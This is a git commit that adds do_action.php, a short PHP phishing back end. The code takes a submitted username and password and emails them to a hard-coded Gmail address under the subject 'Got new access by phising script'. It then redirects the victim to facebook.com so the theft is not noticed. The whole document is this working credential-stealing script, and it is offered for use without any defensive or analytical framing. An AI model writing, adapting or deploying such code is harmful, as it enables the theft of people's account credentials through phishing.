bc7d3e19c5df86a7c94bf72779b95f221b7531e7
ヒルミーサクティ <74033002+HilmySakti@users.noreply.github.com>
2020-12-23 19:13:07 +0700

    Create do_action.php

---
+++ do_action.php
@@ -0,0 +1,23 @@
+<?php
+
+	function mail_sender(){
+		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
+			return false;
+		}
+
+		$username = $_REQUEST['username'];
+		$password = $_REQUEST['password'];
+		
+		$reciever = "abandel09@gmail.com";
+		
+		$subject = "Got new access by phising script";
+		$message = "The username is ". $username;
+		$message .= "and password is ". $password;
+		
+		return mail($reciever, $subject, $message);
+	}
+	
+	if(mail_sender()){
+		header("Location: http://www.facebook.com");
+	}
+?>
